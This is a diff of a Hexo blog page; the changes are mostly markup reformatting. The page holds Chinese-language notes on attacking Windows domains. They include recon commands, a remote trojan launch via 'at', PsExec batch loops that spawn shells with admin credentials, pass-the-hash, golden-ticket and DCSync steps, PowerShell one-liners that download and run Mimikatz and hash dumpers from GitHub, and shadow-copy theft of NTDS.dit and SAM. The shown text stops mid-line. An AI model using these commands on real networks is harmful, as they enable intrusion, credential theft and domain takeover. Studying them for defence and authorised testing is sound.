@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <script>
     (function(){
         if(''){
@@ -28,8 +28,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -47,7 +47,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -81,23 +81,23 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
-
-
-  <meta name="keywords" content="M0rk,blog,security,hack,Hexo" />
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css">
 
 
-
-
-
-  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />
+  <meta name="keywords" content="M0rk,blog,security,hack,Hexo">
 
 
 
 
-  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1" />
+
+  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.1">
 
 
 
@@ -105,12 +105,12 @@
 
 
 <meta name="description" content="TL;DR 域安全笔记域 域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。 域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。 一般情况下，域控制器集成了DNS服务，可以解析域内的计算机">
-<meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="windows域安全">
 <meta property="og:url" content="http://kevien.github.io/2017/09/28/windows域安全/index.html">
-<meta property="og:site_name" content="M0rk's Blog">
+<meta property="og:site_name" content="M0rk&#39;s Blog">
 <meta property="og:description" content="TL;DR 域安全笔记域 域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。 域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。 一般情况下，域控制器集成了DNS服务，可以解析域内的计算机">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://kevien.github.io/2017/09/28/windows域安全/finddc.png">
 <meta property="og:image" content="http://kevien.github.io/2017/09/28/windows域安全/adfind.png">
 <meta property="og:image" content="http://kevien.github.io/2017/09/28/windows域安全/passhash.png">
@@ -152,7 +152,7 @@
 
 
 
-  <link rel="canonical" href="http://kevien.github.io/2017/09/28/windows域安全/"/>
+  <link rel="canonical" href="http://kevien.github.io/2017/09/28/windows域安全/">
 
 
 
@@ -161,7 +161,7 @@
   <title>windows域安全 | M0rk's Blog</title>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
 
@@ -186,13 +186,13 @@
   <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">M0rk's Blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -222,7 +222,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -232,7 +232,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -242,7 +242,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -252,7 +252,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -262,7 +262,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -275,7 +275,7 @@
             <a href="javascript:;" class="popup-trigger">
           
             
-              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
             
             搜索
           </a>
@@ -296,9 +296,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
-             placeholder="搜索..." spellcheck="false"
-             type="text" id="local-search-input">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
     </div>
   </div>
   <div id="local-search-result"></div>
@@ -330,16 +328,16 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/09/28/windows域安全/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M0rk">
       <meta itemprop="description" content="">
       <meta itemprop="image" content="/uploads/avatar.jpg">
     </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="M0rk's Blog">
     </span>
 
@@ -439,41 +437,41 @@
 <li>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</li>
 <li>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</li>
 <li><p>Active Directory = LDAP服务器＋LDAP应用（Windows域控）<br>就是Active Directory先实现一个LDAP服务器，然后自己先用这个LDAP服务器实现了自己的一个具体应用（域控）。</p>
-<h2 id="内网信息搜集以及常见域命令"><a href="#内网信息搜集以及常见域命令" class="headerlink" title="内网信息搜集以及常见域命令"></a>内网信息搜集以及常见域命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">ipconfig /all	查询本机IP段，所在域等</div><div class="line">net config Workstation	当前计算机名，全名，用户名，系统版本，工作站域，登陆域</div><div class="line">net user	本机用户列表</div><div class="line">net localhroup administrators	本机管理员[通常含有域用户]</div><div class="line">net user /domain	查询域用户</div><div class="line">net user 用户名 /domain	获取指定用户的账户信息</div><div class="line">net group /domain	查询域里面的工作组</div><div class="line">net group 组名 /domain	查询域中的某工作组</div><div class="line">net group &quot;domain admins&quot; /domain	查询域管理员列表</div><div class="line">net group &quot;enterprise admins&quot; /domain	获得企业管理员列表</div><div class="line">net group 组名 /del /domain	删除域中的某组</div><div class="line">net group 组名 组成员名 /del /domain	删除域中的某组的组成员</div><div class="line">net localgroup administrators /domain	登录本机的域管理员</div><div class="line">net group 组名 /add	增加域中的组</div><div class="line">net localgroup administrators workgroup\user001 /add	域用户添加到本机</div><div class="line">net group &quot;domain controllers&quot; /domain	查看域控制器(如果有多台)</div><div class="line">net time /domain	判断主域，主域服务器都做时间服务器</div><div class="line">net session	查看当前会话</div><div class="line">net use \\ip\ipc$ pawword /user:username@domain	建立IPC会话[空连接-***]</div><div class="line">net use z: \\192.168.200.21\文件夹名	建立映射到本机Z盘</div><div class="line">net share	查看SMB指向的路径[即共享]</div><div class="line">at \\192.168.200.2  0：00 c:\windows\muma.exe	在共享主机上执行</div><div class="line">net view	查询同一域内机器列表</div><div class="line">net view /domain	查询域列表</div><div class="line">net view /domain:M0RK	查看test域中计算机列表</div><div class="line">net view \\域控的机器名	查看域控共享情况</div><div class="line">nltest /domain_trusts	获取域信任信息</div><div class="line">net session	查看当前会话</div><div class="line">net start	查看当前运行的服务</div><div class="line">net time /domain	查询主域服务器的时间</div><div class="line">echo %logonserver%	查看登录认证的机器(即域控机器)</div><div class="line">net accounts	查看本地密码策略</div><div class="line">net accounts /domain	查看域密码策略</div><div class="line">query user   查看当前的登录信息</div><div class="line">netsh firewall show config	查看防火墙策略</div><div class="line">netsh firewall show state	查看防火墙策略</div><div class="line">route print	路由表</div><div class="line">tracert IP	路由跟踪</div><div class="line">arp -a	列出本网段内所有活跃的IP地址</div><div class="line">arp -s (ip + mac)	绑定mac和IP</div><div class="line">arp -d (iP + mac)	解绑IP和Mac</div><div class="line">tasklist /V	查看进程[显示对应用户]</div><div class="line">tasklist /S ip /U domain\username /P /V	查看远程计算机进程列表</div><div class="line">tasklist /S IP地址 /U 域名\用户名 /P /V	查看远程计算机进程</div><div class="line">tasklist /svc	查看进程</div><div class="line">taskkill /im 进程名称(cmd.exe)	结束进程</div><div class="line">taskkill /pid[进程码]	-t(结束该进程) -f(强制结束该进程以及所有子进程)</div><div class="line">qprocess *	类似tasklist</div><div class="line">qprocess /SERVER:IP	远程查看计算机进程列表</div><div class="line">whoami /all	查询当前用户权限等</div><div class="line">set	查看系统环境变量</div><div class="line">systeminfo	查看系统信息</div><div class="line">qwinsta	查看登录情况</div><div class="line">fsutil fsinfo drives	查看所有盘符</div><div class="line">wmic bios	查看bios信息</div><div class="line">wmic qfe	查看补丁信息</div><div class="line">wmic qfe get hotfixid	查看补丁-Patch号，很实用</div><div class="line">wmic share get name,path	查看SMB指向路径</div><div class="line">net view /domain</div><div class="line">net config workstation</div><div class="line">net group &quot;Domain Admins&quot; /domain</div><div class="line">net time /domain</div><div class="line">ipconfig /all</div><div class="line">nslookup xxx</div><div class="line">dsquery server</div><div class="line"></div><div class="line">查看域控制器</div><div class="line">net group &quot;Domain controllers&quot;</div><div class="line"></div><div class="line">查询所有计算机名称(windows 2003)</div><div class="line"></div><div class="line">dsquery computer</div><div class="line"></div><div class="line">下面这条查询的时候,域控不会列出</div><div class="line"></div><div class="line">net group &quot;Domain Computers&quot; /domain</div></pre></td></tr></table></figure>
+<h2 id="内网信息搜集以及常见域命令"><a href="#内网信息搜集以及常见域命令" class="headerlink" title="内网信息搜集以及常见域命令"></a>内网信息搜集以及常见域命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all	查询本机IP段，所在域等</span><br><span class="line">net config Workstation	当前计算机名，全名，用户名，系统版本，工作站域，登陆域</span><br><span class="line">net user	本机用户列表</span><br><span class="line">net localhroup administrators	本机管理员[通常含有域用户]</span><br><span class="line">net user /domain	查询域用户</span><br><span class="line">net user 用户名 /domain	获取指定用户的账户信息</span><br><span class="line">net group /domain	查询域里面的工作组</span><br><span class="line">net group 组名 /domain	查询域中的某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain	查询域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; /domain	获得企业管理员列表</span><br><span class="line">net group 组名 /del /domain	删除域中的某组</span><br><span class="line">net group 组名 组成员名 /del /domain	删除域中的某组的组成员</span><br><span class="line">net localgroup administrators /domain	登录本机的域管理员</span><br><span class="line">net group 组名 /add	增加域中的组</span><br><span class="line">net localgroup administrators workgroup\user001 /add	域用户添加到本机</span><br><span class="line">net group &quot;domain controllers&quot; /domain	查看域控制器(如果有多台)</span><br><span class="line">net time /domain	判断主域，主域服务器都做时间服务器</span><br><span class="line">net session	查看当前会话</span><br><span class="line">net use \\ip\ipc$ pawword /user:username@domain	建立IPC会话[空连接-***]</span><br><span class="line">net use z: \\192.168.200.21\文件夹名	建立映射到本机Z盘</span><br><span class="line">net share	查看SMB指向的路径[即共享]</span><br><span class="line">at \\192.168.200.2  0：00 c:\windows\muma.exe	在共享主机上执行</span><br><span class="line">net view	查询同一域内机器列表</span><br><span class="line">net view /domain	查询域列表</span><br><span class="line">net view /domain:M0RK	查看test域中计算机列表</span><br><span class="line">net view \\域控的机器名	查看域控共享情况</span><br><span class="line">nltest /domain_trusts	获取域信任信息</span><br><span class="line">net session	查看当前会话</span><br><span class="line">net start	查看当前运行的服务</span><br><span class="line">net time /domain	查询主域服务器的时间</span><br><span class="line">echo %logonserver%	查看登录认证的机器(即域控机器)</span><br><span class="line">net accounts	查看本地密码策略</span><br><span class="line">net accounts /domain	查看域密码策略</span><br><span class="line">query user   查看当前的登录信息</span><br><span class="line">netsh firewall show config	查看防火墙策略</span><br><span class="line">netsh firewall show state	查看防火墙策略</span><br><span class="line">route print	路由表</span><br><span class="line">tracert IP	路由跟踪</span><br><span class="line">arp -a	列出本网段内所有活跃的IP地址</span><br><span class="line">arp -s (ip + mac)	绑定mac和IP</span><br><span class="line">arp -d (iP + mac)	解绑IP和Mac</span><br><span class="line">tasklist /V	查看进程[显示对应用户]</span><br><span class="line">tasklist /S ip /U domain\username /P /V	查看远程计算机进程列表</span><br><span class="line">tasklist /S IP地址 /U 域名\用户名 /P /V	查看远程计算机进程</span><br><span class="line">tasklist /svc	查看进程</span><br><span class="line">taskkill /im 进程名称(cmd.exe)	结束进程</span><br><span class="line">taskkill /pid[进程码]	-t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line">qprocess *	类似tasklist</span><br><span class="line">qprocess /SERVER:IP	远程查看计算机进程列表</span><br><span class="line">whoami /all	查询当前用户权限等</span><br><span class="line">set	查看系统环境变量</span><br><span class="line">systeminfo	查看系统信息</span><br><span class="line">qwinsta	查看登录情况</span><br><span class="line">fsutil fsinfo drives	查看所有盘符</span><br><span class="line">wmic bios	查看bios信息</span><br><span class="line">wmic qfe	查看补丁信息</span><br><span class="line">wmic qfe get hotfixid	查看补丁-Patch号，很实用</span><br><span class="line">wmic share get name,path	查看SMB指向路径</span><br><span class="line">net view /domain</span><br><span class="line">net config workstation</span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br><span class="line">net time /domain</span><br><span class="line">ipconfig /all</span><br><span class="line">nslookup xxx</span><br><span class="line">dsquery server</span><br><span class="line"></span><br><span class="line">查看域控制器</span><br><span class="line">net group &quot;Domain controllers&quot;</span><br><span class="line"></span><br><span class="line">查询所有计算机名称(windows 2003)</span><br><span class="line"></span><br><span class="line">dsquery computer</span><br><span class="line"></span><br><span class="line">下面这条查询的时候,域控不会列出</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Computers&quot; /domain</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>查找域控<br>1.dsquery server(或者net group “domain controllers” /domain命令)查找到主机名，然后ping一下主机名，得到的ip一般就是域控机器的ip地址了。<br>2.使用nslookup命令  _ldap._tcp.dc._msdcs.domainname<br>3.nltest /dclist:domainname<br><img src="/2017/09/28/windows域安全/finddc.png" alt=""><br>4.cobaltstrike的net  dclist直接定位到dc<br>或者使用powershell的powerview 获取域当前的信息<br>5.adfind、ldifde、adexplorer等工具<br><img src="/2017/09/28/windows域安全/adfind.png" alt=""><br>…</p>
 </li>
-<li>常见脚本<br><a href="https://pentestlab.blog/2018/05/28/situational-awareness/" target="_blank" rel="external">https://pentestlab.blog/2018/05/28/situational-awareness/</a><h2 id="搞定域控"><a href="#搞定域控" class="headerlink" title="搞定域控"></a>搞定域控</h2>1.ms14-068 将普通域用户权限提升为域控权限<br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" rel="external">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a><br>2.查看哪些主机上存在域管理员的活动会话，找到域管登陆过的机器，进而抓取域管的密码或者哈希。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">## 批量返回shell</div><div class="line">@echo off</div><div class="line"></div><div class="line">echo check ip addr config file…</div><div class="line"></div><div class="line">if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end</div><div class="line"></div><div class="line">echo read and analysis file…</div><div class="line"></div><div class="line">for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;PASSWORD&quot; cmd </div><div class="line"></div><div class="line">:end</div><div class="line">## 用指定的用户名和密码去遍历ip.txt中的IP列表，并打印任务列表，将结果输出到result.txt当中，执行完了上述批处理，我们只需要稍作等待，最后去查看result.txt当中是否含有域管理员用户名，即可确定哪些主机上存在域管理员的活动会话</div><div class="line">@echo off</div><div class="line"></div><div class="line">echo check ip addr config file…</div><div class="line"></div><div class="line">if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end</div><div class="line"></div><div class="line">echo read and analysis file…</div><div class="line"></div><div class="line">for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p &quot;PASSWORD&quot; /v) &gt;&gt;d:\result.txt</div><div class="line"></div><div class="line">:end</div><div class="line"></div><div class="line">exit</div></pre></td></tr></table></figure>
+<li>常见脚本<br><a href="https://pentestlab.blog/2018/05/28/situational-awareness/" target="_blank" rel="noopener">https://pentestlab.blog/2018/05/28/situational-awareness/</a><h2 id="搞定域控"><a href="#搞定域控" class="headerlink" title="搞定域控"></a>搞定域控</h2>1.ms14-068 将普通域用户权限提升为域控权限<br><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a><br>2.查看哪些主机上存在域管理员的活动会话，找到域管登陆过的机器，进而抓取域管的密码或者哈希。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">## 批量返回shell</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">echo check ip addr config file…</span><br><span class="line"></span><br><span class="line">if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end</span><br><span class="line"></span><br><span class="line">echo read and analysis file…</span><br><span class="line"></span><br><span class="line">for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;PASSWORD&quot; cmd </span><br><span class="line"></span><br><span class="line">:end</span><br><span class="line">## 用指定的用户名和密码去遍历ip.txt中的IP列表，并打印任务列表，将结果输出到result.txt当中，执行完了上述批处理，我们只需要稍作等待，最后去查看result.txt当中是否含有域管理员用户名，即可确定哪些主机上存在域管理员的活动会话</span><br><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">echo check ip addr config file…</span><br><span class="line"></span><br><span class="line">if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end</span><br><span class="line"></span><br><span class="line">echo read and analysis file…</span><br><span class="line"></span><br><span class="line">for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p &quot;PASSWORD&quot; /v) &gt;&gt;d:\result.txt</span><br><span class="line"></span><br><span class="line">:end</span><br><span class="line"></span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
-<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p><img src="/2017/09/28/windows域安全/passhash.png" alt=""><br>哈希传递的工具可参考文章 <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">域渗透——Pass The Hash的实现</a></p>
+<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p><img src="/2017/09/28/windows域安全/passhash.png" alt=""><br>哈希传递的工具可参考文章 <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="noopener">域渗透——Pass The Hash的实现</a></p>
 <h2 id="PTT-silver-ticket"><a href="#PTT-silver-ticket" class="headerlink" title="PTT-silver ticket"></a>PTT-silver ticket</h2><p><img src="/2017/09/28/windows域安全/silverticket.png" alt=""><br><img src="/2017/09/28/windows域安全/machinentlm.png" alt=""></p>
 <ul>
 <li>注意这里机器的NTLM 是关键，域sid都是一样的  <h2 id="PTT-golden-ticket"><a href="#PTT-golden-ticket" class="headerlink" title="PTT-golden ticket"></a>PTT-golden ticket</h2></li>
 <li>域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要拿到了krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击。<br><img src="/2017/09/28/windows域安全/krbtgt1.png" alt=""></li>
 <li>获取krbtgt账号ntlm命令是Lsadump::dcsync  /user:krbtgt <h2 id="抓密码或hash"><a href="#抓密码或hash" class="headerlink" title="抓密码或hash"></a>抓密码或hash</h2></li>
 <li><p>通过powershell抓取某台机器的明文密码或者哈希</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#抓明文</div><div class="line">powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1′); Invoke-Mimikatz –DumpCerts</div><div class="line">#抓哈希</div><div class="line">powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1′);Get-PassHashes</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#抓明文</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1′); Invoke-Mimikatz –DumpCerts</span><br><span class="line">#抓哈希</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1′);Get-PassHashes</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>dump域数据库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">vssadmin Create Shadow /for=C：        创建新的卷影副本</div><div class="line">成功地创建了 &apos;C:\&apos; 的卷影副本</div><div class="line">   卷影副本 ID: &#123;ad7dfdec-a8db-4fa3-b2e6-7e1ab1bad2b4&#125;</div><div class="line">   卷影副本卷名: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3</div><div class="line"></div><div class="line">执行程序：</div><div class="line">\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\test\psexec.exe</div><div class="line">1.需要先创建好目录，并放入木马或程序</div><div class="line">2.再创建新的卷影副本,利用卷影副本卷名来执行程序，并把卷影副本卷名中的 &quot;?&quot; 需要改为 &quot;.&quot;号执行程序</div><div class="line"></div><div class="line">Copy Files</div><div class="line">有些系统运行中的文件是不可复制的，比如像SAM</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\</div><div class="line"></div><div class="line">PowerShell调用方法：</div><div class="line">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -ComputerName SERVER -localDestination &quot;C:\temp\SYSTEM&quot;</div><div 